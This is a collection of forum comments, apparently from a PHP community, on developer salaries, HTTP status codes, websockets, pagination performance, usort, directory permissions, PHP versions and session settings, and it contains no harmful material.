I'm interested to hear more about this. How/where do you find work? How many work with you? How do you manage to not get drowned with requirements by clients (probably a bigger question)?
sure, but its redirecting to a page that IS a 404 (not a 200 thanks to the error controller making the header a 404)... still "wrong" to do?
Yeah location, not only the company but where you live as well. If you make LA money but have the cost of living of a small town, you are doing well for yourself.
Cool tip, will be using that from now on.
That is some sick money with almost $550 a day.
You are what I hope to be in 5-10 years.
Im starting to think php storms marketing dept frequents this place...
I dont understand. No redirects. If the page is missing, that response is 404. If the page is not missing, that response is 200. If the page has any other error, it should return the most relevant code. Each time there is no error, and you return a body, unless the specific error code you use suggests you shouldn't return a body. But redirects are not relevant here.
I work in London for £40,000 without bonuses. I get breakfast, lunch and beers paid for daily so I hardly spend anything on food.
Where do you live?
Is Zend Server 6 worth it? I used 5 and it was ok , it made things a little convenient but nothing worth renewing for.
We currently have a PHP websocket server that proxies through Apache. Built the PHP websocket server from https://github.com/plastbox/php-websocket-server but I've updated it according to the RFC specs here https://github.com/jwestbrook/php-websocket-server Then we use the mod_proxy_wstunnel module in Apache to allow Apache to respond to webocket upgrade requests and pass the requests through to the web socket server (running at localhost bound to a different port) Benefits of running through Apache : one less port open, Apache handles SSL, you can use $_SESSION variables 
I started out doing basic web development, mostly between Zen-Cart and WordPress (although I played with all of the CMS's). I was learning PHP on the fly in order to fix things in plugins and themes, and started getting more and more interested in the underlying code, and what was possible within those frameworks, if you understood the guts a little better. I moved from doing more basic support into more development roles in the companies I worked for, and I continually maintained a small side gig rolling out cheap website builds and basic code projects. One of those side gigs led to a full time job offer as the head web nerd for a start up, and I quit the day job to run in the startup crowd. I had fun with that, but was slowly but surely doing bigger and bigger projects with the side business, despite having already turned one into a full time job. In 2010, I went fully independent, and utterly reliant on client work. For the next 18 months, I starved. I spent all my reserves, borrowed from family, the standard sad sap story. The whole time, I was learning, studying, blogging, social networking, just working the system, and fighting for projects. And when I got the projects, I killed on them. Crushed the deadlines, over delivered, white gloved every client, etc. I built up a solid reputation locally, and because I was willing to explore requests most of the web firms around here don't mess with, I started getting agency work. That's really where things changed. Most small to mid-sized agencies almost exclusively outsource development. They prefer someone reliable and long term, and they're flexible about rate raises once you've proven your worth (I've raised my rates three times in the last 18 months, and am still fully booked for three months out). The agencies who are friendly pass my name around, and I keep getting asked if I can do bigger things, many of which revolve around WordPress, because it's such a common web platform. Right now for example, I have on the plate: - deep integration of MethodCRM via SOAP into a WordPress system which allows event management to logged in users on the WP front end. - a responsive multi-use widget with landscape and portrait layouts which collects leads for a service via form and then sends the leads to different groups through JTracker based on the number of leads purchased by each group, and whose turn it is in the queue. - a migration from Magento to JigoShop, with custom plugins written to support previous Magento functions. It keeps me at 40+ hours a week (although generally only 25-30 of those are billable), and as long as I deliver, the work keeps coming. I landed my first government contract (and had them renew for another year), and I'm expecting to branch out with a few more of those. tl;dr I did the grind for about seven or eight years and paid hella dues. Edit: Crap, that was just the first couple of questions. - I work with one partner and up to seven 10-99 sub-cons. - I clearly state requirements and get agreement, manage tasks in a good CRM, and only work on a retainer pay per hour basis. Clients purchase 40 hours in advance, renew when they run out, and self manage their expectations based on how much time their requests are taking when they track project hours. 
Also in Chicago suburbs. Have about 3 years of PHP experience in the real world (about half of that with Drupal) and unfortunately only at 57k
... Glassdoor.com is real people saying what's out there. Its people anonymously submitting the salary and job title they have. Its this thread, on steroids, archived, saved, parsed by geographic location and in many cases, by company.
Symfony is the answer. Don't reinvent the wheel when you can easily pick and choose brilliantly written components
Contractor here .. I take alot of time off to travel, sit on my arse &amp;amp; play Xbox games to death on release week. In London I make from £300 to £400 per day, depending on the client. I probably only earn £30-35k a year, but it pays my London bills &amp;amp; let's me travel, lots... Helps that I couchsurfer too... Oh, started on PHP 3 in late 2000. I remember a year in, I'd just grasped mysql interaction, finally had my eureka moment, then at 2pm the office stated joking about some idiot who crashed a plane into a building in new York... Now when ever people talk about that day... I think of MySQL... 
Basically you can do what you want and everything is paid for you. Sounds like a dream to be honest.
Yes, it's still wrong to do. It seems like you're trying to work around some limitation of your app that's preventing you serving the correct status code instead of redirecting. That's the underlying problem you should try and fix.
~45k€ in Paris, France (new job, 32k€ some month ago). I do PHP since PHP3 but I'm only a developer professionally since maybe three years, before that it was a side gig (I was in marketing).
Well, I'm not gonna buy a Ferrari anytime soon.. But I'm happy :)
You're not gonna find a PHP developer making $100k per year now a-days. It's not that much in demand anymore. However, you show me a PHP Dev that is also a JS master, and knows Node or coffee script like the back of his hand, or even just a PHP dev that's an expert in relational databases, I'll show you someone making more than $100k per year. To anyone that claims to be making $100k per year as a strict PHP dev, I'm either gonna have to call bullshit, or need some proof. Otherwise, sorry, you can't convince me. Even most Sr. Project Leads/Managers that I know who are in charge of massive multi million dollar projects barely make $100k per year.
Learning proper programming in Node.JS is what made it click for me. I went from creating a number of different modules with specific functional arrangements, came back to my friend's extensive PHP app and said "OH. So *that's* the point of extensions. And classes. And why you do *this* with that object..." Still lost on the proper time to use static, though.
I am making around 1,8k euro per month ... :x and for it's quite a lot :x
About your second point - [haven't tried it myself, but...](http://se1.php.net/manual/en/class.sessionhandler.php). I realize 5.4 might not be the most common PHP version yet, but you never know...
I was abbreviating `$t` because "time" is a reserved word (I think). I used `$u` because it was like `$t` ... and things spiraled from there. :D the rest of my variables were better named! 
Check out this service I made - www.insto.co.uk Fully hosted websocket service, simple JS library and REST APIs. It makes the implementation of websockets really really simple, and it's free! 
I was on the team that originally created ratchet at res.im. Chris (the author) had been tasked with slamming it with thousands of concurrent connections to prove it could handle production for a big project we were working on that spawned rachet originally. At that time he had it working pretty well and since then he's done nothing but improve it, so I suspect it's very production capable.
Uses error suppression (stupid), pointlessly requires an item total. I would not do pagination this way on extremely large datasets.
&gt;I think it's trying to avoid division by 0 errors. Should use max(1, $itemsPerPage) instead. Agreed. &gt;But how would you calculate the number of pages without knowing the total? You wouldn't. Often there's no reason to - most users don't need or care about the total. You just have to estimate. Take google for example - they never give exact counts for anything. It's always a guess. Reddit also gives no exact counts for anything. You'll never see total page counts anywhere on the reddit site. [The API](http://www.reddit.com/dev/api) doesn't even do limit x,y - it takes a number to get, and an element to start after when paging. This is so it can do a targetted select on a specific item, and then get X number of rows which are greater than the ID of the target item. If they implemented pagination like the OP is suggesting the site would be dead in seconds due to its insane traffic and massive databases. &gt;And most databases are optimized so that count(*) queries are very inexpensive even with a lot of rows. This is **false**. Many databases are not optimized for count(\*) at all except for in the most basic cases. For example, innodb does not keep running totals at all. count(\*) queries can be extremely expensive the first time they're run and if you can help it, you should avoid them unless you're sure your where clause limits the dataset enough to be a non-issue. Most RDBMS will cache a count(\*) query after it is run the first time, but the cache is only good for the criteria in that particular where clause, and only for as long as there are no changes to the table which impact the scanned data set. It may be extremely expensive the first time through. **There are no special optimizations beyond caching when you do count(\*), use a where clause, and anything other than MyIASM which most people should avoid.** Please refer to the [mysql manual](http://dev.mysql.com/doc/refman/5.1/en/group-by-functions.html#function_count) to get it from the horse's mouth. &gt;COUNT(*) is optimized to return very quickly if the SELECT retrieves from one table, no other columns are retrieved, and there is no WHERE clause. For example: &gt; &gt;This optimization applies only to MyISAM tables only, because an exact row count is stored for this storage engine and can be accessed very quickly. For transactional storage engines such as InnoDB, storing an exact row count is more problematic because multiple transactions may be occurring, each of which may affect the count. On tables with rowcounts in the hundreds of thousands, I've had count(*) operations take up to 5 minutes. Don't take my word for it - try it yourself. Just remember, if you run the same query multiple times you'll only experience the slowdown once. For even more fun, run 10 queries at the same time which ask for different data.
Static sort of lets you use classes like packages or namespaces. So if you have a Number class which could take on a 'NaN' (Not a Number) value. You might have a function Number.isNumber($val). Sometimes you would use it inside the class or on an object (with $val = this as the default parameter). But sometimes you might want to test something else (maybe a string or something), so you don't want to instantiate the object just to call a single method. At least I think that is the proper usage of it.
Bay area, currently between $100k and $200k a year (I can't provide specific values publicly here). I've been programming since PHP/FI.
What really grinds my gears are books that you spend a decent amount of money on which are full of errors. I counted over 100 in the last Drupal book I read, then I read the online errata and found more. Screw those people.
This is very cool. I saw that you could do this, but was not 100% sure how to go about it since supposedly they had some code which allowed symphony2 to use sessions in rachet code. My brain was like, WTF how!!!.. the only issue though with sessions is that it makes doing concurrent transfers and such less concurrent in that you cannot do lots of ajax calls simultaneously because if one ajax call takes too long, it may hold up others from running. Makes me wonder if this is even an issue with rachet. Sessions require the request open &amp; closing of sessions using some kind of file-lock.
Any contribution can ultimately be a good contribution, just be open to pull requests.
So you use the ID you stored to access some kind of storage layer I guess? That mean that each time you want to get some user specific info you have to use this ID to query your storage layer, when you could do it just one time (at user login for example).
That's what I do, yes. And this post makes a lot of sense, so thanks for sharing!
I'm assuming that my code was where you saw the timezone. I have a bunch of session variables because I'm lazy. The positive side effect is that I don't have to touch my database for each page load, but in general this makes it easier (for me) to deal with my data. My variables always have the same name, because I'm not re-declaring them.
It may be, but $time isn't. That's one advantage to using $sigils for variable names.
I think you'd be better off using a namespace for that.
Can you point me at a solid explanation of when / how to use namespaces? I saw mention of it before and ignored it, because I had no idea why I'd need it.
Really cool sharpness detection. I worked with OCR technology for my internship and that really got me into image processing. Really interesting stuff. Keep up the awesome work!
PHP currently has 3 stable builds that it's supporting, check out http://php.net/downloads.php. * 5.5.2 * 5.4.18 * 5.3.27 The 5.4 and 5.3 release are only given security fixes. 5.5 is the current release that is getting new features and performance improvements. PHP (and many other projects) keeps the old versions around as a courtesy to people that are still using the older versions and have not upgraded yet. Why older versions stay around is a much bigger topic that I'm not going to get in to. I understand this is a brief answer so feel free to ask follow up questions.
That makes me feel better about the universe! I couldn't figure out at all why older versions might be in 'Active Development' - and they're not! Supported != Active Development. Thanks!
This is music to my ears. I was not entirely aware of Session collisions yet i've had this problem for some time somewhere in a live application and couldnt find the source of the problem.
$65k. College dropout. Five years experience with PHP. I started as a graphic designer, (Quark XPress, InDesign, PhotoShop) then a web designer (HTML, CSS, JavaScript) and then got into development (LAMP + jQuery). I like having a good eye for design and then being able to make it work. Now I'm getting into Python, node.js and backbone. Should be getting to the $90k range as soon as I get my CS bachelor's in another year.
35k, small western PA company. I'm just out of college with a strong freelance resume, no corporate experience, and a communication degree.
As already stated, when your code catches the error, you should directly change the response status code instead of redirect the browser. With any framework, that would be pretty easy, otherwise use the header() or the http_response_code () functions (the latter is for PHP 5.4+) And remember : using redirections is just asking the browser to perform another request, which is costly for the server.
While PDO is a good solution, I think what you are looking for is ezSQL by Justin Vincent. It is well documented and super easy to work with - has a handy debug function built in.
You probably know it : with PHP you can use Object Oriented Programming or imperative programming. The best practices vary very much between this 2 paradigms. for example, with imperative programming, using arrays for your menus is perfectly fine : they are a lightweight general purpose data structure. With OOP, you will probably want to create specific objects. Back to your question : this site seems to get quite some hype these days : http://www.phptherightway.com/ Some basics that helped me when I started : - don't start with a framework (even if you already did OOP in another language) : it will hide the PHP standard library and it will be harder for you to learn how the language works - if you find a tutorial on DB management that does not use the Mysqli or PDO libraries, run away (the old mysql_* functions are deprecated, unmaintained and lack of features) - give your code a clean structure : you already know MVC, stick with it even if you don't use OOP - if you really want to start with a framework, use a microframework like slim or silex : they only manage request/response lifecycle, leaving you free to structure your code as you wish. - read code from other people and code as much as you can ! Hope that helps
Thanks so much! Yeah, I'm trying to learn to build a framework from scratch rather than get confused by a large complex framework, and just picking the best micro mvc framework is hard enough. I was going to use micromvc but will now check out slim and silex, thanks. I've seen the site phptherightway.com - it has some good info - but nothing about specific parts of apps like navigation, at least I can't find that info. I just finished reading PHP and MySQ Web Development (4th edition), which helped me a lot (best n00b php book I've found), but I still find myself wondering if its code examples at the end of the book are 'standard practice'. I'll keep looking around, thanks!
5.4.x is only receiving security fixes? I thought they were providing bug fixes on 5.4.x branch, and only security fixes on 5.3.x?
Do a small project. Make it work right. Move to the next project. Use what you learned in the last project to make your next prone t better. Read. Read more. Use stackoverflow. Someone has probably already gone through what you're going through and solved your problem. Read a book on computer science. Object oriented programming. Then MVC. Never give up. Keep asking questions. (Type them into google first before asking out loud) keep learning. Is the ultimate key. Good luck. 
You could use [Laravel](http://laravel.com) with [domain routing](http://laravel.com/docs/routing#sub-domain-routing), this way you can share you views/controllers etc as needed between domains easily.
Thanks heaps! I agree that a framework is best practice now and actually think its a natural evolution of mvc. I've built a few apps with others but as much as we used mvc and patterns... our frameworks were always evolving yet lacking compared to what others have built. So now I'm trying to start from scratch learning to build a framework that I can adapt my existing and future apps around, while of course, evolving the framework I develop to suit the apps too. Yeah - composer, PSR, etc all appear to be common components of the most used frameworks that I've found and so appear to be requirements of any framework I build too. I'll check out that link now, thanks! I'm still getting used to ORMs... I used one in a python framework in the past... but none of the apps I've worked on have used them. However, I'm keen to find the right one and will check out Laravel's. Certainly can't wait to use others libraries/classes/etc! The issue I'm finding at the mo is actually finding what is the best way of doing stuff... so I can judge which third party code is best to use. But I guess that comes from experience.
Awesome advice and encouragement - thank you so much!!! The more I get into coding the more I'm thinking of studying CompSci. Thanks again!
you're right : - 5.5 = bug fixes, and enhancements (like the new strict session on 5.5.2) - 5.4 = bug fixes - 5.3 = only critical fixes EOL announce for PHP 5.3 : http://php.net/archive/2013.php#id2013-07-11-1
It's a childhood fear of mine, but curly braces have always scared me.... 
Before your call to `mkdir()`, try printing: getcwd() . DIRECTORY_SEPARATOR . $gallery_folder ...and make sure that your path is what you expected. You're using a relative path, instead of an absolute path, so PHP may be looking in an unexpected place, depending on how the script is being called. If you've verified that the path is correct, then the problem is most likely that the user PHP is running as does not have permissions to create directories in that location.
lol... However, you can specify your own separators in the engine constructor.
Yes, I forgot about that, thanks.
Chances are your code is running under a different user such as "www-data" which Apache uses. And that user does not have write permissions on the directory it is trying to write to. Using the "chown" command might help.
We still use 5.3.x because it is the default version that Ubuntu 12.04 uses. 
$35k. This my first job as a developer, and I've been at it for three months.
I would recommend two things. The first is that you work with absolute paths because you might run into a case where you run this same code in two different directories and gallery folder won't be in the same spot. The other is that you use the [is_writable](http://php.net/manual/en/function.is-writable.php) function to check to make sure that directory is writable before you start your loop. Then you can present yourself with an error on how to fix it. You'll also need to make sure that your web server user has write access. I would recommend you run (I'm assuming you're running linux with shell access) `chown &lt;www-data&gt; gallery` and `chmod o+rwx gallery`. That way the process will have access. The &lt;www-data&gt; might not be the correct username but you can check out [this article](http://www.thisprogrammingthing.com/2013/how-to-get-the-current-user-name-and-group-php-is-running-under/) for a small snippet on how to get the current user name.
I found that but it looks as though it doesn't work with Sqlite3. 
You can use usort to sort an array using your own comparison function. In your case the function "cmp" is used to sort the array and it is sorting the array by points. Probably the array being sorted contains objects that have points, "$a-&gt;points" refers to the points of the object ($a) being sorted. edit: changed sorting algorithm to comparison function.
ah. here's the code I'm trying to figure out. I understand everything up until the cmp function. http://pastebin.com/KSQKssuM I don't quite understand how the cmp function works to sort out the array simply with 0, 1, and -1. Does usort just compare * array[0] and array[1] then * array[1] and array [2] then * array[2] and array [3] etc? Also. With "$a-&gt;points", is that referring to the points from the array up top ('key' =&gt; 'points',)?
Umm, you can fix this yourself as well. Just invalidate any of the current sessions before running your login script.
[`usort()`](http://php.net/usort) allows you to specify your own comparison function for sorting. The example you provided expects that the input for `usort()` is an array of objects that have the property `points`. The values that the function returns (-1, 0, 1) correspond to the following: &gt; `0 :` both elements are the same &gt; `-1:` the first element is smaller than the second &gt; `1 :` the first element is greater The part `([condition]) ? [true] : [false]` is called a [ternary statement](http://php.net/manual/en/language.operators.comparison.php#language.operators.comparison.ternary). It basically is a shorthand for an if/else block. If you were to rewrite: return ($a-&gt;points &gt; $b-&gt;points) ? -1 : 1; You would get: if($a-&gt;points &gt; $b-&gt;points) { return -1; } else { return 1; }
Ah. Ok. Now I'm having a hard time trying to understand how the cmp function is able to sort an array simply with 0, 1 , -1 Can you do a step through of how the cmp function would sort say array(4,20,23,20,7) thanks!
I guess it works like thi: compare each element against each other element. Add up all the -1,0,1's and sort by that sum.
Hope this helps. You may run this code to see exactly how it sorts: $numbers = array(4,20,23,20,7); usort($numbers,function($a,$b){ echo "&lt;br /&gt;now comparing a: $a with b: $b"; if ($a == $b) { return 0; } if ($a &gt; $b) { return 1; } return -1; }); echo "&lt;br /&gt;"; print_r($numbers);
No, you cannot provide your own sorting algorithm. You can only provide your own comparison function.
Yes you can think of it like that, it keeps comparing 2 items from the array over and over again using your "cmp" function. The array up top is not referred to by "$a-&gt;points". On line 14 it looks like the function get_users() is used to get users from a database and it uses the array up top to configure how to get the users, it looks like it's getting all the users which have 2 points or more. So now $users contains a list of users and each user has points. In the "cmp" function $a-&gt;points and $b-&gt;points refer to: $users[0]-&gt;points and $users[1]-&gt;points $users[1]-&gt;points and $users[2]-&gt;points $users[2]-&gt;points and $users[3]-&gt;points etc.
You're right, fixed.
[sort](http://www.php.net/sort) uses an implementation of the Quicksort algorithm.
Which algorithm would the example I'm using be? insertion/selection/bubble/etc?
I'm sure that is a reason but it's not the only one.
I often store de-normalized copies of user-specific data that changes infrequently into the session to save unnecessary relational DB queries on every page load. Typically, I will make use of framework events/extended methods to clear user session-cache when certain actions occur, such as a user editing their profile and/or I will set a timer variable in the session too, so that if x seconds have passed since the data was last loaded then the data will be re-populated from the database.
why's that ? they are paying me to give up some spare time ... i work around 50-60hrs/week for my fixed job :)
I mean that's great money. 550 a day is a lot.
Since it's using $a-&gt;points and not $a['points'] doesn't that mean $a is an object, or does the former work on arrays and I just never knew?
Yes, all php sorting seems to pass through zend_qsort. https://github.com/infusion/PHP/blob/master/Zend/zend_qsort.c
You are right, it would trigger an 'trying to get property of non-object' error. Didn't read it well enough before answering ;-).
Note that the implementation of this feature seems to slightly differ to what was outlined/proposed in the RFC. Have just done a fresh PHP 5.5.2 complile to test. The setting is called **session.use_strict_mode** and by default it is **NOT** enabled, nor is it defined in the supplied php.ini-development/php.ini-production. This is different to the RFC header summary (patch details) which lists the php.ini setting as **session.use_strict_session** and says it will be enabled by default. Note that **session.use_strict_mode** is mentioned further along in the RFC document. **EDIT:** Not trashing this feature at all, I think it's great - but until the PHP docs are updated the RFC notes might give some people the wrong idea around the implement/use of this feature.
For me it's phpunit. I love the suite but I sure wish it ran faster. If you use it with DBUnit, even on a powerful workstation with good drives powering the database it's slow! Oh well, mandated coffee breaks while the test suite runs :-)
Actually, now I'm questioning how well this was actually tested, unless I'm totally mis-understanding the use of this functionality - had to disable this feature for now. I have a very, very simple script which I use to serve up static HTML templates during frontend HTML/CSS development which uses a session to cache page title data to avoid repeat hits/parsing - very basic session work here, nothing special tricky. https://github.com/magnetikonline/prettytemplateindex/blob/master/index.php On first page hit, the call to session_start() is fine. On every other call I get this error message **Warning: session_start(): The session id is too long or contains illegal characters, valid characters are a-z, A-Z, 0-9 and '-,'** If I kill the PHPSESSID session variable, it's all good again for the first hit - every other hit gives the same warning. So it seems PHP is creating a new session ID and then on next call throwing a warning that said session variable value does not meet the length/character requirements?
The regular sort function needs an array of numbers. What happens if you have an array of objects? You use `usort` and give it a function which says which object is the greater for any two. The example assumes the array consists of objects which each have a field called `points`. 
thanks! I tried DFT with a Laplace convolution (its a popular stack overflow suggestion) but got pretty poor results when comparing images with different content. I have some article somewhere that Microsoft put out on Blind Image Quality (where you use an algorithm to judge how good looking an image is) using wavelets (i believe they are much like FT but can detect spikes much much better) http://research.microsoft.com/pubs/155043/576_iqa.pdf
I've worked for a few well funded startups that used PHP. Generally speaking, as long as you keep the basic principles in mind, your using best practice but the biggest one: Code reusability, (if your copy pasting your doing it wrong unless there's a time crunch ofc) Yeah you know the rest.. decent variable names, etc.. Naming conventions, using arrays vs objects, etc.. I have seen change depending on where I work. Its more a matter of preference from the people hired before you. Its not a big deal, in the end, if its readable its fine. 
Have you tried using a non-PHP solution for the image scanning such as ImageMagick? I don't know if it has functions that could apply to what you are doing, but I know offloading image reading/changing to it results in much faster algorithms. At least when it comes to the basics that is.
There are no best standards, or even "standard ways". You are going to spend your whole career looking for this answer, and never find it. You may want to rephrase your question(s) like so : "currently I use static page linking - is this a good idea and what are alternative methods and their pros and cons. I provide a small snippet of my code below to show what I mean". You will get lots of answers, such as "your way is terrible, your way is great, it depends, etc.". Over time you slowly learn the pros and cons of different ways and build your own best standards. Even then, you work for a company or customer who have their own way of doing things, as set by the technical lead and his/her experience. This may directly contradict your opinion of the right way to do things. They may want to do things how they have done it for the last X years, using their internal standards and in a manner consistent with their existing code. Also, as time goes by, new frameworks, libraries, recommendations, language versions, devices and "standards bodies" turn up and keep challenging what you thought. You keep wondering if you know enough or need to learn the new stuff. How do you choose what to learn - no-one can know everything. Here are some fun questions for you to ponder: - should you use space or tabs in your code. - should yur variables use underscores or camelCaps or something else. - should you follow PEAR, PECL, PSR, other standards. - should your PHP output HTML (ie. echo '&lt;form action="xxx.php"&gt;' - should you use Zend_Form or similar to output html - should you externalize your literal strings (for foreign languages) or should you use external HTML views that you can load at runtime. - should you create Single Page Apps (SPA) or apps with multiple pages for different functionality. - what front end stuff should you use (jquery, YUI, other) - my_sqli or PDO? - functions or objects - SOAP or REST for APIs - mySql or Postgres or SQL Server or Oracle or DB2 ? - should you batch programs be in php? - what CC interface to use/ecommerce cart/IDE Lots of silly questions - there is no "standard". Maybe a better question is to ask how people would approach and structure a new app not using a framework, then ask the same question with a few different frameworks. Or ask about coding standards for a new project both at current employment and if you were not constrained by any job constraints. Now I have said all that, here is how I would structure an app nowadays without a framework and with no 'customer' constraints: I would create an SPA, put all my html in a skin file that is loaded in to the main DIV at runtime (based on a config file for language/runtime settings for device). I would try to have a fluid responsive design. I would use class names instead of ids where possible. I would have events that make ajax calls to retrieve data, post data,process db interactions, run batch jobs etc. My folder structure is basically public (for html, css, plugins, skins, ajax stub) and private (secured by htaccess, or not in the html folder so impossible for someone to access with a browser) which contains PHP classes with business and database logic etc. I would have separate classes for APIs and adapter classes for different APIs for same function (i.e. 2 credit card gateways, 2 mailing houses, 2 SOAP/REST apis returning similar data). I would use PDO to write to a mySQL db. All error and app logs are output to private/data/phplogs/xxx where xx is date and userid stamped. Every PHP method outputs to the log files so I have a good stack trace. In the front end I do as much as possible using CSS and use jQuery extensively. All javascript functions are stored in literal objects grouped logically and (if in debug mode) all functions output data to the console log so I can see what is happening. I would use a token based system to stop cross-site hacking and protocol filters in the ajax stub. All parameters passed via ajax will be sanitized both at the client (during entry) and again at the server. I would enable SSL if this app handles financial transactions. I would do all this unless the customer required something different, or the app did not suit this structure, or I decided to use Zend or Laravel or another framework, or I did the app in Python, Ruby, Perl or C, or ..... (you get the idea). Almost all the work I do is customer driven - I will write the app any way they want it to meet their existing coding standards and using their existing framework as necessary. If they want to package it with composer I will do it. If they want to use SVN or GIT I will do it. I need to know a little about as much of the new stuff as possible and how to quickly learn anything a customer requries me to use. in fact this is the biggest 'standard way' i have. Whatever technology the customer wants, within reason, I can figure out quickly and implement. 
You can walk through the free portion of the widely popular Laravel 4 book, if you are looking for a great introduction to the how and why's. http://codebright.daylerees.com/code-happy Having read this I will never try to reinvent the wheel again as the existing work and features are just so good. As much as it's cool to build your own framework, it's bad practice from a maintenance perspective. You will have to create your own documentation and security, which will most likely be subpar compared to a open source community driven framework. My two cents. Good luck!
Codeception with REST module looks like the most natural solution. http://codeception.com/docs/10-WebServices#REST You can execute REST commands via interactive console and thus test everything manually.
Yep, that with the fact that suhosin-patch, and suhosin-extension is not yet available with newer versions.
This, listen to this man.
What does Zend Sever do and why should I use it? 
I use [Paw](http://luckymarmot.com/paw) on mac. It's handy to be able to copy and paste a request into the terminal to get a curl command, and it has nice presentation. With Silex's web profiler provider, you get a debug token in the headers so you can bring up profiling and debugging info in a browser tab to get some in-depth info on your requests. The current version has some minor annoyances, but the developer is responsive. All told it's a great tool. 
As someone who can write his own router, and someone who at some level has dealt with hiring and recruiting most of his career, here is some advice on this. Learn a framework. Zend or Symfony are the only two I'd recommend outright. This does actually make an impression. Learning and understanding Zend and Symfony show case that you should at least be able to speak about various design principles. And this will do more to help show that you know how to abstract things out. I mean, writing a specialized router that you can plug into Zend is much better than your own standalone router. &gt; wanting to be able to prove that I can, in fact, write in pure php? Your confusing "pure php" with "programming." I could care less if someone can write pure PHP. Hell, I don't want a programmer that suffers from NIH syndrome. What I want is someone who can program. And that doesn't have anything to do with understanding "pure PHP." For example: you want to be able to write your own router. One of the things you'll need to learn is the HTTP protocol. Hell, at this point I'd be impressed if someone can write out a basic http/1.0 request header. From an interview perspective, if you mentioned writing your own router, I'd ask about the HTTP protocol. I'd ask you about how you handled cacheing of the handlers and routes. I'd also want to have you explain the differences between your router and existing routers. You mentioned this before: &gt; it's "make a really awesome site without using any frameworks, libraries, etc. that I don't create on my own" That's awesome! And I think it's something every PHP programmer does at least once. =) But you also said this: &gt; MVC is my friend - but it's a friend I'm keeping at arm's distance for this project Instead of MVC, what are you doing to separate concerns? MVC isn't limited to pre-build frameworks. Heck, it's not something that even needs a real framework. It's a model of separating concerns. Sorry for the long post. It really wasn't more of a flow-of-conciousness than any solid comment, so please excuse anything that doesn't make sense. =)
92K, 5 years with the full stack. Primarily working with PHP/MySQL. 
i have for something else. I chose php simply because it was easier to interface with our webapp. As long as you can get the RGB of a pixel, acutance is pretty easy to calculate
Thanks, I'll check out that book! I agree that frameworks are the way to go... rather reinventing the wheel... but I'm still finding them too packed with features I may not need for sometime, which only confuse/distract me from learning to do the basics 'right'. This may sound counter-intuitive, but if I knew enough now, I'd jump into using a big framework. Instead, I'm happy to make a few mistakes while learning before then.
Thanks, You've restated my sentiment exactly, which is that is there isn't likely to be a perfect 'right way', and my question directly jumps to and is even titled with regards to building 'parts' of apps as close to any ''standard way' as much is possible', rather than relying on any framework because they differ so much, evolve, etc. I don't think your questions are silly at all - rather they are the type of questions I ask myself, and the types of questions I listed are related. This is why I've been looking for micro frameworks, code examples, and asking here about any common ways of coding parts of apps. I want to learn enough about good coding practices for apps that I can develop my own framework throughout my apps or better choose an existing one. I don't mind being guided/forced to code a particular way by a framework, but I'll always wonder if there is a better way and if I would have found it if I learned to build my own framework first, or at least know as much about 'standard' as possible. Thanks so much for outlining your approach to coding a new app - it's what I've been wondering in general right down to what are the best libraries, third party classes, etc.
Brut = gross salary
For PDO, here's a shameless plug: http://prash.me/php-pdo-and-prepared-statements/ Doesn't go into too much detail about handling errors and exceptions, but I think it's a good start? :)
Thanks! Having been in a startup, with 3 apps we pivoted through... and spaghetti code through to a re-useable code base with a rather hacky framework, I've always wondered how the 'well funded startups' bootstrap their code base, whether through a framework or do they invent their own for proprietary reasons eg for IP and investment. Would you be able to elaborate about common coding conventions/standards/framework stuff in, say in the best startup you've worked in, that is what you've learned from working on the most well engineered app? 
You are welcome. Feel free to ask any more specific questions. I've been doing this for a long long time :-)
Read this, http://www.sitepoint.com/books/phppro1/
Seeing the code without something explaining the reason why things are the way they are won't help you as much as you think it will. Get a [good book](http://books.google.com/books?id=iyIvGGp2550C&amp;dq=isbn:0201633612&amp;hl=en&amp;sa=X&amp;ei=BLARUrTwLuGSyAGCooHADQ&amp;ved=0CC4Q6AEwAA). Don't limit yourself to books with "PHP" in the title. OO programming is much older than PHP.
&gt;Help me find a code If it's already been a couple of years then it's high-time you found out that 'code', in this meaning, is an uncountable noun!
Coding in C-based languages must be a horrible experience for you. 
I started PHP by making an MVC system with OOP on my own with pure PHP, spent many many hours on it, the only parts I didn't make were the password hashing class, and a very simple logging class. Along the way I had to make a TON of decisions, how do I access the class in the controller? Where do the settings go? How do all my classes access the database, work with each other, and deal with user access? How should I set up the user table? I did everything, I changed some parts along the way and spent hours troubleshooting simple issues. All in the name of learning php face-first. I accepted this as a learning task that would go nowhere and impress no-one. Then I tried to make another app, and I tried re-using bits of my old app, because I was familiar with it, and it would be quick to just copy in, right? Wrong! I couldn't just copy the user class in, I had to copy the database class too, they were too interconnected. Then I had to go through the code and change lots of things that had been hard coded, everything was broken and I spent way too much time re-working the classes to fit my new app. Flash forward some months and this is how I see things: A well built Library/Class (Using best practice SOLID/OOP) is a good tool, it'll do something for you, and it will do it well. It was built by someone who is very familiar with that type of tool, and peer tested and used by many other people. Composer is Home Depot. Need a tool? Go get it, it's better to get a hammer than make one if you just want to hammer a nail. A framework is (usually) a well set up workshop, you've got all the tools where they need to be, lots of them are in the most efficient place, the drill is next to the power socket, the hammer is next to the nails, there's good lighting and a nice workbench. The shop was built and designed by a toolmaker who's been doing it a long time, they set it up the way they think it should be. You have to use the shop the way it sits, or sometimes you can rearrange parts or bring your own tools, depending on the rules of the shop. You could build your own workshop, with your own tools, but as a newer user, how many times will you have to redesign your tablesaw, or move it to the other corner of the workshop to be closer to the dust vacuum? In my original MVC, my hammer was attached to my tablesaw with a 12' chain, and my nails were made of brick, all because I didn't know any better. Now, if you did want to make your own hammer, would you first look at other hammers to see if you could copy or improve it? From what I understand, Micro-Frameworks are kinda like a shop with the bare-essentials, and you can bring most of your own favorite tools with you. It's great for a bunch of things. But what if your project out-grows the space provided, and you wish you used a bigger workshop? Someone correct me if I'm wrong, but that's how I see things... 
I guess we agree to disagree then. :) But considering the fact that you are studying computer science, it might be your curiosity that gets the better of you, practically speaking. Nevertheless, keep learning, and good luck!
Per month?
*Considering it's the only web-programming language I use*, **I don't hate PHP, I hate PHP's not being all it can be.** *And there's a lot that could be improved*. **Stupid example:** We have *__toString()* but we don't have alternatives for the other built-in types like *__toArray()* or *__toBool()*. Or the lack of core Unicode *(at least 2byte if not 4byte chars)* for strings. And there's so many other small things that add up, some Windows specific.
That's so sad. I have 6 years PHP and 9 years overall and i am on "entry level". Central European.
*__toArray()* allows you to expose an array of properties from some private variables that you are managing within. It's a way to add another layer of protection to PHP's over-lax data-types. You use setter and getter functions to manage unreachable properties and you can expose them to an array for query string encoding or DB insertion. If you did any C++ you'd know what *__toBool()* is for as in the *explicit bool operator* we now have in C++11.
